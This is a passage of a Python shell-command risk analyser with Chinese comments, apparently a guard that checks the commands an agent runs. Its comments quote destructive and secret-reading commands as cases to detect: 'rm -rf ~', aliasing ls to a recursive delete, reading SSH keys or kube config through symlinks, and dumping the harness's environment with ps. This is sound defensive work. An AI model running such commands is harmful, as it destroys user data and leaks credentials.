            a.flag_catastrophic(f"函数参数太多（{len(args)} 个），又会挪动位置参数，其中有 {risky} 这样的参数；请拆成几条命令")
        else:
            a.bump("external", f"函数参数太多（{len(args)} 个），又会挪动位置参数，无法逐个分析")
    return views[:_VARIANT_LIMIT]


def _bind_positional(args: list[str], a: CommandAnalysis) -> dict:
    """把位置参数（$1、${10}……、$@、$*、$#）当作一定赋过值的变量绑上这次的参数，返回原来的样子供恢复。
    参数个数之后的 ${N} 是空的：至少绑到 $9，再往后没绑的按“可能为空、值未知”处理。"""
    names = ["@", "*", "#", *map(str, range(1, max(9, len(args)) + 1))]
    saved = {n: (a.vars.get(n), n in a.sure) for n in names}
    joined = " ".join(args)
    for n in names:
        v = joined if n in ("@", "*") else str(len(args)) if n == "#" else (args[int(n) - 1] if int(n) <= len(args) else "")
        a.vars[n] = [v]
        a.sure.add(n)
    return saved


def _restore_positional(saved: dict, a: CommandAnalysis) -> None:
    for n, (vals, sure) in saved.items():
        if vals is None:
            a.vars.pop(n, None)
        else:
            a.vars[n] = vals
        (a.sure.add if sure else a.sure.discard)(n)
    a.assigned -= set(saved)


def _body_text(body: list[str]) -> str:
    """函数体的词拼回一条命令。``${@:2}`` 这类截取换成 ``$@``：截掉几个由 _arg_views 的各种截法覆盖。"""
    out = []
    for t in body:
        if _OPERATOR.fullmatch(t) or t in RESERVED:
            out.append(t)
        else:
            out.append(_requote([re.sub(r"\$\{([@*]):[^}]*\}", r"$\1", t)]))
    return " ".join(out)


def _root_hit(t: str, a: CommandAnalysis, depth: int) -> str | None:
    """t 实际落到根目录、家目录（depth=1 时再加它们下面一级）时，返回说明它的文字。相对路径按可能的当前目录拼起来
    （``cd ~ && rm -rf *``）；含可能为空的变量时按变量为空再判一次（``rm -rf $DIR/*`` 就是 ``rm -rf /*``）。
    整个词都为空时 bash 直接丢掉它，不算。"""
    ev, names = _empty_variant(t)
    for form, empty in ((t, []), *([(ev, names)] if names and ev else [])):
        for cwd in a.cwds:
            joined = form
            if cwd and _to_abs(cwd).startswith("/") and not _to_abs(form).startswith(("/", "$")):
                joined = _from_abs(posixpath.join(_to_abs(cwd), form))
            d = _root_depth(joined)
            if d is None or d > depth:
                continue
            where = f"（当前目录是 {cwd}）" if joined != form else ""
            if empty:
                return (f"{joined}{where}：变量 {'、'.join(empty)} 为空时 {t} 就是 {ev}。"
                        f"先确认变量非空（如 ${{{empty[0]}:?}}），或者写出完整路径")
            return f"{joined}{where}"
    return None


@functools.lru_cache(maxsize=16)
def _realroot(workspace: str) -> str:
    return os.path.realpath(workspace)


def _real_paths(word: str, a: CommandAnalysis) -> list[str]:
    """词在工作区里实际指向的位置：跟随符号链接，glob 按 bash 的规则展开（不含点文件）。
    没有工作区、或者词是选项 / 变量 / 绝对路径（交给 _is_outside 按字面判断）时返回空。
    匹配太多、通配层数太多时不逐个确认，按工作区外处理：只看前一部分的话，链接可能就藏在后面。"""
    if not a.workspace or not word or word.startswith(("-", "$", "~", "/")) or len(word) > 1024 or "\0" in word:
        return []
    if word in a.cache:
        paths, why = a.cache[word]
    else:
        root, names, why = _realroot(a.workspace), [word], ""
        if _GLOB_CHARS.search(word):
            if sum(1 for part in word.split("/") if _GLOB_CHARS.search(part)) > _GLOB_DEPTH:
                why = f"{word} 的通配层数太多，没法逐个确认匹配到的真实位置"
            else:
                try:
                    found = list(itertools.islice(glob.iglob(word, root_dir=root), _GLOB_LIMIT + 1))
                except (OSError, ValueError):
                    found = []
                if len(found) > _GLOB_LIMIT:
                    why = f"{word} 匹配到的文件超过 {_GLOB_LIMIT} 个，没法逐个确认真实位置"
                names = found[:_GLOB_LIMIT] or names   # 没匹配到时 bash 原样传参
        paths = [os.path.realpath(os.path.join(root, x)) for x in names]
        a.cache[word] = (paths, why)
    if why:
        a.bump("external", why)
    return paths


def _within(real: str, root: str) -> bool:
    return real == root or real.startswith(root.rstrip(os.sep) + os.sep)


def _in_workspace(path: str, a: CommandAnalysis) -> bool:
    """绝对路径字面上在工作区里。紧贴在选项后的路径不经过 analyze() 开头的改写，这里补上。"""
    return bool(a.workspace) and _within(posixpath.normpath(path), a.workspace.rstrip("/"))


def _is_outside(path: str, a: CommandAnalysis) -> bool:
    """工作区内的绝对路径在 analyze() 开头已被替换成 ./ 前缀，这里剩下的绝对路径都在工作区外；
    相对路径按每个可能的当前目录拼起来，用 normpath 判断是否经 .. 爬出了工作区，再按真实路径判断——
    工作区里的符号链接可以指向任何地方。当前目录可能在工作区外或不知道在哪时，相对路径同样按越界处理。
    以变量开头、又带 / 的词（``$D/passwd``）落在哪里取决于变量的值，按越界处理；值要到运行时才知道的变量在哪都一样。"""
    if path in SAFE_ABS or path.startswith("-"):
        return False
    if _opaque(path, a) or (_VAR_HEAD.match(path) and "/" in path):
        return True
    if path.startswith(("/", *_HOME)):
        return True
    for cwd in a.cwds:
        if cwd is None or cwd.startswith(("/", "~")):
            return True
        rel = os.path.join(cwd, path) if cwd else path
        if ".." in rel and os.path.normpath(rel).split("/", 1)[0] == "..":
            return True
        if any(not _within(real, _realroot(a.workspace)) for real in _real_paths(rel, a)):
            return True
    return False


def _check_secrets(text: str, a: CommandAnalysis) -> None:
    m = CREDENTIAL_HINTS.search(text)
    if m:
        a.flag_credential(f"涉及凭证位置 {m.group(0)}")
    elif SECRET_HINTS.search(text):
        a.bump("dangerous", "涉及凭证/密钥路径")


def _check_link(word: str, a: CommandAnalysis) -> None:
    """按真实路径再查一次敏感清单：``cat notes.txt`` 读到的可能是 ``~/.ssh/id_rsa``（工作区里的符号链接），
    ``cd ~/.ku""be && cat config`` 读到的是 ``~/.kube/config``（相对路径按可能的当前目录拼起来）。"""
    val = word.split("=", 1)[1] if word.startswith("-") and "=" in word else word
    if not val or val.startswith("-"):
        return
    reals: list[str] = []
    for cwd in a.cwds:
        if cwd is not None and cwd.startswith(("/", "~")):
            if not val.startswith(("$", "~", "/")):
                reals.append(os.path.realpath(os.path.expanduser(os.path.join(cwd, val))))
        elif cwd is not None:
            reals += _real_paths(os.path.join(cwd, val) if cwd else val, a)
    for real in reals:
        level = sensitivity(real)
        if level == "deny":
            a.flag_credential(f"{val} 实际指向凭证位置 {real}")
            return
        if level == "ask":
            a.bump("dangerous", f"{val} 实际指向密钥文件 {real}")


def _expand_braces(word: str) -> tuple[list[str], bool]:
    """bash 的花括号展开（``{a,b}``、``{1..3}``，可嵌套）。返回 (展开结果, 是否完整)；超过上限时不完整。

    shlex 已经去掉了引号，``'{a,b}'`` 这种 shell 不会展开的写法这里也会展开——多判出几个词，只会更保守。"""
    if "{" not in word:
        return [word], True
    if len(word) > 2048 or word.count("{") > 32:
        return [word], False
    done, todo = [], [word]
    while todo:
        if len(done) + len(todo) > _BRACE_LIMIT:
            return done + todo, False
        w = todo.pop(0)          # 按 bash 的顺序展开：{rm,} -rf ~ 的第一个词是 rm
        span = _brace_span(w)
        if span is None:
            done.append(w)
        else:
            i, j, alts = span
            todo.extend(w[:i] + alt + w[j + 1:] for alt in alts)
    return [w for w in done if w] or done, True   # 展开出的空词 bash 会丢掉


def _brace_span(w: str) -> tuple[int, int, list[str]] | None:
    """找出第一组会被展开的花括号：返回 ({ 的位置, 配对的 } 的位置, 各个分支)。``${VAR}`` 与 ``{a}`` 不展开。"""
    start = 0
    while (i := w.find("{", start)) != -1:
        start = i + 1
        if i > 0 and w[i - 1] == "$":
            continue
        depth, commas = 0, []
        for j in range(i, len(w)):
            if w[j] == "{":
                depth += 1
            elif w[j] == "}":
                depth -= 1
                if depth == 0:
                    break
            elif w[j] == "," and depth == 1:
                commas.append(j)
        else:
            continue  # 这个 { 没有配对的 }，按普通字符处理；里面的 {b,c} 仍会展开（bash：{a{b,c} → {ab {ac）
        if commas:
            cuts = [i, *commas, j]
            return i, j, [w[x + 1:y] for x, y in zip(cuts, cuts[1:])]
        m = _BRACE_RANGE.fullmatch(w[i + 1:j])
        if m and m.group(1) is not None:
            return i, j, [str(x) for x in _brace_range(int(m.group(1)), int(m.group(2)), m.group(5))[:_BRACE_LIMIT + 1]]
        if m:
            return i, j, [chr(x) for x in _brace_range(ord(m.group(3)), ord(m.group(4)), m.group(5))]
    return None


def _brace_range(lo: int, hi: int, incr: str | None) -> range:
    """``{lo..hi..incr}``：方向由两端决定，步长的正负不管用，0 按 1 算。"""
    sign = 1 if hi >= lo else -1
    return range(lo, hi + sign, sign * (abs(int(incr or 1)) or 1))


def _program_words(seg: list[str]) -> set[int]:
    """段里 sed / awk 程序文本的位置。程序几乎都写在引号里，shell 不展开里面的花括号，shlex 却已经去掉了引号：
    ``awk 'BEGIN{print "a", "b"; system("x")}'`` 按逗号展开之后程序就碎了，后半截成了数据文件。"""
    for k, w in enumerate(seg):
        name = w.rsplit("/", 1)[-1]
        if name in ("sed", "awk", "gawk", "mawk"):
            return {k + 1 + j for j in _script_args(name, seg[k + 1:]).words}
        if not (_ASSIGN.fullmatch(w) or w in RESERVED or w.startswith("-") or name in WRAPPERS):
            break
    return set()


def _classify(seg: list[str], a: CommandAnalysis, stdin: list[str] | None = None) -> None:
    # 花括号展开发生在命令执行之前、作用于每个词：rm -rf {~,build} 实际执行的是 rm -rf ~ build
    expanded: list[str] = []
    programs = _program_words(seg)
    for k, w in enumerate(seg):
        words, complete = ([w], True) if k in programs else _expand_braces(w)
        if not complete:
            a.bump("external", "花括号展开的结果过多，无法静态分析")
        expanded.extend(words)
    # 然后是变量展开：命令里赋过值的按每种取值各分析一遍（C=rm; $C -rf ~ 实际执行的是 rm -rf ~）
    todo: list[tuple[list[str], str | None]] = [(w, None) for w in _substitute(expanded, a)]
    if _DRIFT in (a.vars.get("IFS") or ()):
        seen = [w for w, _ in todo]
        for sep in _drift_seps(expanded, a):
            for w in _substitute(expanded, a, drift=sep):
                if w not in seen:
                    seen.append(w)
                    todo.append((w, sep))
    for words, sep in todo:
        a.budget[0] -= 1
        if a.budget[0] < 0:
            a.flag_catastrophic(_OVER_BUDGET)
            return
        was = a.catastrophic
        _classify_words(words, a, stdin)
        if a.catastrophic and not was and sep is not None:
            a.catastrophic_reason = (f"source 执行的脚本可能把 IFS 改成了 {sep!r}，变量展开后可能拆成 {' '.join(words)}："
                                     f"{a.catastrophic_reason}")


def _classify_words(expanded: list[str], a: CommandAnalysis, stdin: list[str] | None = None) -> None:
    a.prefix = {}
    for w in expanded:
        _check_secrets(w, a)  # 这时看到的是 shell 去掉引号、展开花括号之后的样子：~/.k''ube/config、~/.ku{be,}/config
        _check_link(w, a)     # 再按真实路径查一次：工作区里的符号链接可以指向凭证
    words = _unwrap(expanded, a)
    if not words:
        return
    if m := re.fullmatch(r"BASH_ALIASES\[['\"]?([^\]'\"]+)['\"]?\]=(.*)", words[0], re.S):   # 另一种定义别名的写法
        words = ["alias", f"{m[1]}={m[2]}"]
    if words[0] in a.defs:
        _call(words[0], words[1:], a)
    cmd = words[0].rsplit("/", 1)[-1]
    args = words[1:]

    # 重定向写文件
    redirect_targets: set[int] = set()
    for j, w in enumerate(words):
        if w in REDIRECTS and j + 1 < len(words):
            redirect_targets.add(j + 1)
            target = words[j + 1]
            if target in ("/dev/null", "&1", "&2") or (w == ">&" and (target.isdigit() or target == "-")):
                continue
            if target.startswith("/dev/"):
                if _BLOCK_DEV.match(target):
                    a.flag_catastrophic(f"写入块设备 {target}")
                else:
                    a.bump("dangerous", f"写入设备文件 {target}")
            elif _is_outside(target, a):
                a.bump("external", f"重定向写入工作区外路径 {target}")
            else:
                a.bump("write", f"重定向写入文件 {target}")
    for target in _written_args(cmd, args):
        if _BLOCK_DEV.match(target):
            a.flag_catastrophic(f"{cmd} 写入块设备 {target}")
    # 工作区边界：参数（含 --opt=/path 的值）里出现工作区外路径；sed / awk 的程序文本不是路径
    programs = _script_args(cmd, args).words
    for j, w in enumerate(args, start=1):
        if j in redirect_targets or j - 1 in programs:
            continue
        val = w.split("=", 1)[1] if w.startswith("-") and "=" in w else w
        if cmd in READ_CMDS and (m := _GLUED_PATH.fullmatch(w)) and not _in_workspace(m[1], a) \
                and not (cmd == "sort" and w.startswith("-T")):    # sort -T 是放临时文件的目录，不读内容
            val = m[1]
        if _is_outside(val, a):
            if _opaque(val, a):
                why = f"路径 {val} 里的变量要到运行时才知道值，位置无法静态判断，按工作区外处理"
            elif _VAR_HEAD.match(val):
                why = f"路径 {val} 以变量开头，位置无法静态判断，按工作区外处理"
            elif not val.startswith(("/", *_HOME)) and any(c is None or c.startswith(("/", "~")) for c in a.cwds):
                why = f"之前切换到了工作区外或无法确定的目录，{val} 按工作区外处理"
            else:
                why = f"访问工作区外路径 {val}"
            a.bump("external", why)
            break

    plain = _no_redirects(args)
    if cmd in SHELLS and _reads_stdin(plain):    # sh <<< '...'、sh <<EOF、echo ... | sh：标准输入就是脚本
        for text in stdin or ():
            if text.strip():
                _recurse(text, a, f"{cmd} 的标准输入")
    if cmd in SHELLS and (script := _shell_script(plain)) is not None:
        _shell_c(cmd, script, a)
        if cmd in _FOREIGN_SHELLS:
            a.bump("write", f"{cmd} 的语法和 sh 不同，按可写处理")
    elif cmd == "eval":
        _recurse(" ".join(args), a, "eval", mode="same")
    elif cmd == "trap":
        _trap(args, a)
    elif cmd == "watch":
        _watch(args, a)
    elif cmd in ("source", "."):
        a.bump("external", f"{cmd} 执行脚本文件，内容无法静态分析")
        _forget(a)
    elif cmd == "alias":   # shopt -s expand_aliases 之后，alias ls='rm -rf ~' 让 ls 执行的就是 rm -rf ~
        for x in args:
            if "=" in x and not x.startswith("-"):
                name, _, value = x.partition("=")
                _define(name, ("alias", value), a)   # 用到时接上参数再分析（alias r='rm -rf'; r ~），见 _call
                _recurse(value, a, "alias", mode="sub")
        a.bump("write", "alias 定义别名")
    elif cmd in ("cd", "pushd", "popd"):
        _chdir(cmd, args, a)
        a.bump("read", f"{cmd} 切换目录")
    elif cmd in ("for", "select"):
        _loop_header(args, a)
        a.bump("read", f"{cmd} 循环")
    elif cmd in _VAR_SETTERS:
        _var_setters(cmd, args, a)
        a.bump("write", f"{cmd} 给 shell 变量赋值")
    elif cmd in DANGEROUS_CMDS:
        a.bump("dangerous", f"高危命令 {cmd}")
        dev = next((x[3:] for x in args if x.startswith("of=")), "")
        if cmd == "dd" and _BLOCK_DEV.match(dev):
            a.flag_catastrophic(f"dd 写入块设备 {dev}")
        script = next((args[k + 1] for k, x in enumerate(args[:-1]) if x in ("-c", "--command")), None)
        if cmd == "su" and script is not None:
            _recurse(script, a, "su -c")
    elif cmd.startswith("mkfs"):
        a.flag_catastrophic(f"格式化文件系统 {cmd}")
    elif cmd in ("env", "printenv") and not args:
        a.bump("external", "输出全部环境变量（可能包含密钥）")
    elif cmd == "ps" and _ps_shows_env(args):
        # 子进程的环境已经剥掉了密钥，ps 看的却是别的进程——包括 harness 自己（ps eww -p $PPID）。与 /proc/*/environ 同档
        a.flag_credential("ps 带 e/E 选项会打印进程的环境变量（等同读取 /proc/<pid>/environ），包括 harness 自身的密钥")
    elif cmd == "rm":
        flags = "".join(x for x in args if x.startswith("-"))
        targets = [x for x in args if not x.startswith("-")]
        recursive = "r" in flags or "R" in flags
        hit = next((h for t in targets if (h := _root_hit(t, a, 1))), None) if recursive else None
        if hit:
            a.flag_catastrophic(f"递归删除 {hit}")
        elif recursive and any(t.rstrip("/") in ("*", "..", ".", "") or _is_outside(t, a) or _has_ref(t) for t in targets):
            a.bump("dangerous", "递归删除工作区外路径、整个工作区，或者目标取决于变量")
        else:
            a.bump("write", "删除文件")
    elif cmd in ("chmod", "chown") and any(x in ("-R", "--recursive") for x in args) and \
            (hit := next((h for t in args if not t.startswith("-") and (h := _root_hit(t, a, 0))), None)):
        a.flag_catastrophic(f"递归修改根目录/家目录的权限：{hit}")
    elif cmd == "git":
        _git(args, a)
    elif cmd == "find":
        if any(x in ("-delete", "-exec", "-execdir", "-ok", "-okdir") for x in args):
            a.bump("write", "find 带 -delete/-exec")
            _find_actions(args, a)
        elif any(x in ("-fprint", "-fprint0", "-fprintf", "-fls") for x in args):
            a.bump("write", "find 把结果写入文件")
        else:
            a.bump("read", "find 只读搜索")
    elif cmd in ("export", "declare", "typeset", "local", "readonly"):
        opts = "".join(x[1:] for x in args if x.startswith("-"))
        # export -n、declare +x：子进程里又看不到了
        unexport = (cmd == "export" and "n" in opts) or any(x.startswith("+") and "x" in x for x in args)
        for x in args:
            if x.startswith(("-", "+")):
                continue
            name = x.split("=", 1)[0].rstrip("+")
            if _ASSIGN.fullmatch(x):
                _check_assign(x, a)
                _assign(x, a, nameref="n" in opts and cmd != "export")
            elif cmd == "local" and re.fullmatch(r"[A-Za-z_]\w*", x):   # local X：函数里的 X 变成空的
                _assign(x + "=", a)
            if unexport:
                a.exported.discard(name)
            elif cmd == "export" or "x" in opts:
                a.exported.add(name)
        a.bump("write", f"{cmd} 修改 shell 变量")
    elif cmd == "perl" and any(re.fullmatch(r"-[A-Za-z]*i.*|--in-place.*", x) for x in args):
        a.bump("write", "perl -i 原地修改文件")     # 含合写的短选项
    elif cmd == "sed":
        _sed(args, a)
    elif cmd in ("awk", "gawk", "mawk"):
        _awk(cmd, args, a)
    elif cmd in INTERPRETERS and any(x in ("-c", "-e", "--eval") or re.fullmatch(r"-[A-Za-z]*[ce]", x) for x in args):
        a.bump("external", f"{cmd} 内联代码无法静态分析")   # 含合写的短选项：python3 -Ic、perl -ne、node -pe
        a.inline = True
    elif cmd in SHELLS and _reads_stdin(plain):
        a.bump("external", f"{cmd} 从标准输入执行脚本，内容无法静态分析")
    elif cmd in ("python", "python3") and args[:1] in (["--version"], ["-V"]):
        a.bump("read", "查询版本")
    elif (cmd, args[0] if args else "") in NET_INSTALL:
        a.bump("external", f"{cmd} {args[0]} 会访问网络并修改依赖")
        a.network = True
    elif cmd in EXTERNAL_CMDS:
        a.bump("external", f"{cmd} 访问外部系统")
        a.network = True
    elif cmd in WRITE_CMDS:
        a.bump("write", f"{cmd} 可能修改文件或执行代码")
        _embedded_catastrophe(cmd, args, a)
    elif cmd in READ_CMDS:
        if cmd == "printf":
            _var_setters(cmd, args, a)
        risk = _read_options(cmd, args)
        if cmd in ("less", "more"):     # +!命令、+|标记 命令
            for x in args:
                if x.startswith("+") and (m := re.search(r"!(.+)|\|.(.+)", x, re.DOTALL)):
                    _recurse(m[1] or m[2], a, f"{cmd} 的启动命令")
        if risk:
            a.bump(*risk)
            a.inline = a.inline or risk[0] == "external"
        else:
            a.bump("read", f"{cmd} 只读")
    else:
        a.bump("write", f"未知命令 {cmd}，按可写处理")
        _embedded_catastrophe(cmd, args, a)


def _written_args(cmd: str, args: list[str]) -> list[str]:
    """命令把数据写到哪些参数指定的文件：tee 写每一个，cp、mv 写最后一个（第一个只是读，``cp /dev/sda backup.img`` 不算）。"""
    operands = [x for x in _no_redirects(args) if not x.startswith("-")]
    return operands if cmd == "tee" else operands[-1:] if cmd in ("cp", "mv") else []


def _getopt(args: list[str], takes: str, optional: str, longs: dict[str, str]) -> tuple[list[tuple[str, str, int]], list[int]]:
    """按 getopt 走一遍参数：选项和位置参数可以穿插，``--`` 之后都是位置参数。返回 ([(选项字母, 值, 值所在的下标)],
    位置参数的下标)。takes 是必须带值的短选项，optional 是值只能紧贴的短选项；longs 是长选项到短字母的对照，
    长选项可以缩写，有歧义时取排在前面的，所以要紧的写在前面。不在对照里的长选项当作不带值。"""
    opts: list[tuple[str, str, int]] = []
    pos: list[int] = []
    i = 0
    while i < len(args):
        x = args[i]
        if x == "--":
            pos += range(i + 1, len(args))
            break
        if not x.startswith("-") or x == "-":
            pos.append(i)
        elif x.startswith("--"):
            key, eq, val = x.partition("=")
            c = next((v for k, v in longs.items() if k.startswith(key)), "")
            if c and c in takes and not eq and i + 1 < len(args):
                i += 1
                val = args[i]
            if c:
                opts.append((c, val, i))
        else:
            for j, c in enumerate(x[1:], start=1):
                if c in takes or c in optional:
                    val = x[j + 1:]
                    if not val and c in takes and i + 1 < len(args):
                        i += 1
                        val = args[i]
                    opts.append((c, val, i))
                    break
                opts.append((c, "", i))
        i += 1
    return opts, pos


class _Script(NamedTuple):
    text: str                           # 程序文本，多段按行接起来
    words: set[int]                     # 程序文本所在的词：不是路径，不过工作区边界
    loaded: bool                        # 程序从文件加载，内容看不到
    opts: list[tuple[str, str, int]]    # 见 _getopt


_SED_OPTS = ("eflI", "i", {"--expression": "e", "--file": "f", "--in-place": "i", "--line-length": "l"})
_AWK_OPTS = ("eEfFilvW", "dDLop", {"--source": "e", "--file": "f", "--exec": "E", "--include": "i", "--load": "l", "--debug": "D",
                                   "--dump-variables": "d", "--pretty-print": "o", "--profile": "p",
                                   "--field-separator": "F", "--assign": "v"})


def _script_args(cmd: str, args: list[str]) -> _Script:
    """sed / awk 的程序来自哪里：``-e``、``--expression``、``--source`` 的值，都没有也没从文件加载时是第一个位置参数，
    其余位置参数是数据文件，照常按路径判断。别的命令没有程序文本。"""
    if cmd == "sed":
        code, load, spec = "e", "f", _SED_OPTS
    elif cmd in ("awk", "gawk", "mawk"):
        code, load, spec = "e", "fEilD", _AWK_OPTS
    else:
        return _Script("", set(), False, [])
    opts, pos = _getopt(args, *spec)
    letters = {c for c, _, _ in opts}
    redirects = {j for k, w in enumerate(args) if _OPERATOR.fullmatch(w)
                 for j in (k, k + 1, *([k - 1] if k and args[k - 1].isdigit() else []))}   # 2>/dev/null 切出来是三个词
    pos = [k for k in pos if k not in redirects and (args[k] or "i" not in letters)]      # BSD 的 sed -i ''
    # gawk 的 -W 名字=值 就是 --名字=值，mawk 的 -W exec 文件也是从文件加载：都按看不到内容算
    risky = [o for o, c in spec[2].items() if c == code or c in load]
    wide = [v.split("=", 1)[0] for c, v, _ in opts if c == "W"]
    loaded = bool(letters & set(load)) or any(w and o.startswith("--" + w) for w in wide for o in risky)
    parts = [(v, k) for c, v, k in opts if c == code]
    if not parts and not loaded and pos:
        parts = [(args[pos[0]], pos[0])]
    return _Script("\n".join(v for v, _ in parts), {k for _, k in parts}, loaded, opts)


def _short_opts(args: list[str], takes_value: str) -> set[str]:
    """拆开短选项簇（``-uo`` → u、o），遇到带值的选项就停：``-T/tmp/foo`` 里的 o 是值，不是 ``-o``。"""
    found: set[str] = set()
    for x in args:
        if x == "--":
            break
        if len(x) < 2 or x[0] != "-" or x[1] == "-":
            continue
        for c in x[1:]:
            found.add(c)
            if c in takes_value:
                break
    return found


def _read_options(cmd: str, args: list[str]) -> tuple[str, str] | None:
    """“只读”命令里执行命令或写文件的选项。返回 (等级, 原因)，没有时返回 None。"""
    longs = {x.split("=", 1)[0] for x in args if x.startswith("--")}
    if cmd == "rg" and (hit := longs & {"--pre", "--hostname-bin"}):
        return "external", f"rg {min(hit)} 会执行指定的程序"
    if cmd == "ag" and "--pager" in longs:
        return "external", "ag --pager 会执行指定的分页程序"
    if cmd == "sort":
        if hit := longs & {"--compress-program", "--files0-from"}:
            return "external", f"sort {min(hit)} 会执行指定的程序或从文件里取要读的路径"
        if "--output" in longs or "o" in _short_opts(args, "kotST"):
            return "write", "sort -o 写入文件"
    if cmd == "uniq" and len(_positional(args, {"-f", "-s", "-w", "--skip-fields", "--skip-chars", "--check-chars"})) >= 2:
        return "write", "uniq 的第二个参数是输出文件，会被覆盖"
    if cmd == "tree" and _short_opts(args, "LPIoHT") & {"o", "R"}:
        return "write", "tree -o / -R 把结果写入文件"
    if cmd in ("less", "more"):
        if "k" in _short_opts(args, "bhjkoOpPtTxyz#D") or any(x.startswith("--lesskey") for x in longs):
            return "external", f"{cmd} 加载的 lesskey 文件可以设置预处理命令（LESSOPEN）"
        if any(x.startswith("+") and ("!" in x or "|" in x) for x in args):
            return "external", f"{cmd} 的启动命令里有 shell 命令"
        if _short_opts(args, "bhjkoOpPtTxyz#D") & {"o", "O"} or longs & {"--log-file", "--LOG-FILE"}:
            return "write", f"{cmd} -o 把内容写入日志文件"
    if cmd == "file" and ("C" in _short_opts(args, "efFmMP") or "--compile" in longs):
        return "write", "file -C 在当前目录写入编译后的 magic 文件"
    if cmd == "printf" and args[:1] and args[0].startswith("-v"):
        name = args[0][2:] or (args[1] if len(args) > 1 else "")
        if BENIGN_ENV.fullmatch(name):
            return "write", "printf -v 给 shell 变量赋值"
        return "external", f"printf -v 给变量 {name} 赋值，可能改变后续命令实际执行的程序"
    return None


def _positional(args: list[str], takes_value: set[str]) -> list[str]:
    """位置参数：跳过选项与选项带的值。"""
    out, i = [], 0
    while i < len(args):
        x = args[i]
        if x == "--":
            return out + args[i + 1:]
        if x in takes_value:
            i += 2
            continue
        if not x.startswith("-") or x == "-":
            out.append(x)
        i += 1
    return out


_SED_NUM = re.compile(rf"(?:\d|{_VAR_REF.pattern})+(?:~(?:\d|{_VAR_REF.pattern})+)?")   # 地址里的变量当作数字
_SED_PLAIN = frozenset("=dDgGhHnNpPxzF")     # 不带参数的命令
_SED_COUNT = frozenset("lLqQ")               # 可以跟一个数字
_SED_LABEL = frozenset(":btTv")              # 跟一个标签，到空白、; 或 } 为止
_SED_LINE = frozenset("aicerRwW")            # 参数一直到行尾：文本、文件名或要执行的命令
_SED_EFFECT = frozenset("erRwW")             # 执行命令、读写别的文件


def _sed_bracket(t: str, i: int) -> int:
    """t[i] 是 ``[``：返回方括号表达式之后的位置（里面的分隔符不算数，``s/[^/]*$//``）。没有配对时只跳过这个 ``[``。"""
    j = i + 1
    j += t[j:j + 1] == "^"
    j += t[j:j + 1] == "]"
    while j < len(t) and t[j] != "\n":
        if t[j] == "]":
            return j + 1
        if t[j:j + 2] in ("[:", "[.", "[="):
            j = t.find(t[j + 1] + "]", j + 2)
            if j < 0:
                break
            j += 1
        j += 1
    return i + 1


def _sed_delim(t: str, i: int, d: str, regex: bool = True) -> int | None:
    """从 i 起找没转义的分隔符 d，返回它的位置；找不到返回 None。"""
    while i < len(t):
        c = t[i]
        if c == d:
            return i
        if c == "\n":
            return None
        if c == "\\":
            i += 2
        elif c == "[" and regex:
            i = _sed_bracket(t, i)
        else:
            i += 1
    return None


def _sed_addr(t: str, i: int, step: bool = False) -> int | None:
    """跳过一个地址，返回它之后的位置（没有地址就是 i）；正则地址没闭合返回 None。step：第二个地址还能写 ``+N``、``~N``。"""
    if step and t[i:i + 1] in ("+", "~"):
        i += 1
    if m := _SED_NUM.match(t, i):
        return m.end()
    if t[i:i + 1] in (_LIT, "$"):
        return i + 1
    if t[i:i + 1] == "/":
        end = _sed_delim(t, i + 1, "/")
    elif t[i:i + 1] == "\\" and i + 1 < len(t):
        end = _sed_delim(t, i + 2, t[i + 1])
    else:
        return i
    if end is None:
        return None
    end += 1
    while t[end:end + 1] in ("I", "M"):
        end += 1
    return end


def _sed_line(t: str, i: int, continued: bool = False) -> int:
    """i 所在的行尾。continued：行尾的反斜杠续行（a、i、c 的文本）。"""
    while (end := t.find("\n", i)) != -1:
        if not continued or (end - len(t[i:end].rstrip("\\")) - i) % 2 == 0:
            return end
        i = end + 1
    return len(t)


def _sed_commands(t: str) -> list[tuple[str, str]] | None:
    """按 sed 的语法走一遍程序，返回有副作用的命令 [(字母, 参数)]：e、r、R、w、W，``s`` 的 e、w 标志也算成这两个命令，
    e 的参数是替换文本（模式空间就是它要执行的内容）。写法认不出时返回 None。

    先跳过地址（数字、``$``、``first~step``、``/re/``、``\\cREc``、``addr,+N``、``!``），地址后面的第一个字母才是命令：
    只有这样才分得清 ``s/e/w/``、``/e/p`` 里的字母是数据。"""
    found: list[tuple[str, str]] = []
    i, n = 0, len(t)
    while True:
        while i < n and t[i] in " \t\n;{}":
            i += 1
        if i >= n:
            return found
        addressed = i
        i = _sed_addr(t, i)
        if i is not None and i > addressed:
            while t[i:i + 1] in (" ", "\t"):
                i += 1
            if t[i:i + 1] == ",":
                i += 1
                while t[i:i + 1] in (" ", "\t"):
                    i += 1
                start, i = i, _sed_addr(t, i, step=True)
                if i == start:
                    return None
        if i is None:
            return None
        while t[i:i + 1] in (" ", "\t", "!"):
            i += 1
        if i >= n:
            return None if i > addressed else found
        c, i = t[i], i + 1
        if c == "{":
            continue
        if c == "#":
            i = _sed_line(t, i)
            continue
        if c in _SED_LINE:
            end = _sed_line(t, i, continued=c in "aic")
            if c in _SED_EFFECT:
                found.append((c, t[i:end].strip()))
            i = end
        elif c in ("s", "y"):
            mid = _sed_delim(t, i + 1, t[i:i + 1], regex=c == "s") if t[i:i + 1] not in ("", "\n", "\\") else None
            end = None if mid is None else _sed_delim(t, mid + 1, t[i], regex=False)
            if end is None:
                return None
            replacement, i = t[mid + 1:end], end + 1
            while c == "s" and t[i:i + 1] and t[i] in "gpiImMew0123456789":
                if t[i] == "e":
                    found.append(("e", replacement))
                if t[i] == "w":
                    end = _sed_line(t, i)
                    found.append(("w", t[i + 1:end].strip()))
                    i = end - 1
                i += 1
        elif c in _SED_LABEL:
            while t[i:i + 1] in (" ", "\t"):
                i += 1
            while i < n and t[i] not in " \t\n;}":
                i += 1
        elif c in _SED_COUNT:
            while t[i:i + 1] and t[i] in " \t0123456789":
                i += 1
        elif c not in _SED_PLAIN:
            return None
        while t[i:i + 1] in (" ", "\t"):
            i += 1
        if i < n and t[i] not in ";\n}#":
            return None


def _sed(args: list[str], a: CommandAnalysis) -> None:
    script = _script_args("sed", args)
    if any(c in "iI" for c, _, _ in script.opts):
        a.bump("write", "sed -i 原地修改文件")     # 含合写的短选项：sed -Ei、sed -ni.bak
    if script.loaded:
        a.bump("external", "sed -f 从文件读取程序，内容无法静态分析")
        a.inline = True
        return
    commands = _sed_commands(script.text)
    if commands is None:
        a.bump("external", "sed 程序认不出，里面可能有写文件或执行命令的命令")
    elif not commands:
        a.bump("read", "sed 流式处理")
    for c, arg in commands or ():
        a.bump("external", "sed 程序含 w/e/r 命令（写文件、执行命令或读别的文件）")
        if c == "e":
            a.inline = True
            if arg:
